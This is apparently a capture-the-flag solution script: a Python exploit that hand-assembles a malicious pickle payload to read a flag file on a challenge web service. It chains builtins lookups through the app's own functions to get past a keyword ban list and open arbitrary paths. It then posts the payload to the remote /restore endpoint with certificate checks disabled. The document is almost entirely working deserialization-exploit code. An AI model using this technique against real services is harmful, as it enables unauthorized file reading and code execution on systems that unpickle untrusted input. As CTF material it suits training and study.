#!/usr/bin/env python3
"""Time Capsule — pickle RCE without eval/exec/os.

Gadget chain (all payload bytes legal under the ban list):
  Capsule().cache = sessionstore.__builtins__   (a dict: builtins.__dict__)
  render(capsule, 'print') -> print
  render(capsule, 'next')  -> next
  render(capsule, 'open')  -> open
  render(capsule, 'bytes') -> bytes
  bytes((102,47,...))      -> b'/app/flag.txt'   (no "."/"flag" bytes!)
  open(b'/app/flag.txt')   -> file
  next(file)               -> first line of flag
  print(line)              -> stdout (returned as "output")

REDUCE is only "banned" via pickletools.dis text; the check() swallows its own
ValueError, and unpickling proceeds anyway.
"""
import base64
import json
import os
import ssl
import sys
import urllib.request

HOST = "d49ae0d8011d60aa.chal.ctf.ae"


def build(path: bytes) -> bytes:
    ints = b"".join(b"L%d\n" % b for b in path)  # LONG opcode = decimal digits + \n

    # NOTE: the C Unpickler (used by webapp) requires a MARK before INST.
    p = bytearray()
    p += b"("                        # MARK
    p += b"isessionstore\nCapsule\n"  # Capsule()
    p += b"("                        # MARK
    p += b"S'cache'\n"
    p += b"csessionstore\n__builtins__\n"  # builtins dict
    p += b"d"                        # {'cache': builtins_dict}
    p += b"b"                        # capsule.cache = builtins_dict
    p += b"p0\n"                     # memo0 = capsule
    p += b"0"                        # pop
    # fetch print / next / open / bytes through render().
    # Each INST consumes its own preceding MARK; chain marks (before each
    # callable) stay alive for the closing TUPLE+REDUCE calls.
    p += b"(g0\nS'print'\nisessionstore\nrender\n"    # [print]
    p += b"("                                        # M1 (line arg frame)
    p += b"(g0\nS'next'\nisessionstore\nrender\n"    # [print, M1, next]
    p += b"("                                        # M2 (file arg frame)
    p += b"(g0\nS'open'\nisessionstore\nrender\n"    # [print, M1, next, M2, open]
    p += b"("                                        # M3 (path arg frame)
    p += b"(g0\nS'bytes'\nisessionstore\nrender\n"   # [.., M3, bytes]
    p += b"((" + ints + b"ltR"                        # bytes([ints]) -> path bytes
    p += b"tR"                                     # open(path) -> file
    p += b"tR"                                     # next(file) -> line
    p += b"tR"                                     # print(line) -> stdout
    return bytes(p)


def run(payload: bytes, local: bool) -> str:
    if local:
        sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "challenge"))
        import webapp

        out, dis = webapp.restore(base64.b64encode(payload).decode())
        return repr(out) + " | dis: " + repr(dis)
    b64 = base64.b64encode(payload).decode()
    req = urllib.request.Request(
        f"https://{HOST}/restore",
        data=json.dumps({"payload": b64}).encode(),
        headers={"Content-Type": "application/json"},
    )
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with urllib.request.urlopen(req, context=ctx, timeout=20) as resp:
        return resp.read().decode()


if __name__ == "__main__":
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    if args:
        HOST = args[0]
    local = "--local" in sys.argv
    for path in (b"/app/flag.txt", b"flag.txt"):
        print("=== path:", path, "===")
        p = build(path)
        banned = [x for x in (b".", b"os", b"system", b"popen", b"subprocess",
                              b"commands", b"exec", b"eval", b"import",
                              b"getattr", b"setattr", b"flag") if x in p]
        print("banned substrings in payload:", banned or "NONE")
        print(run(p, local) or "(no output)")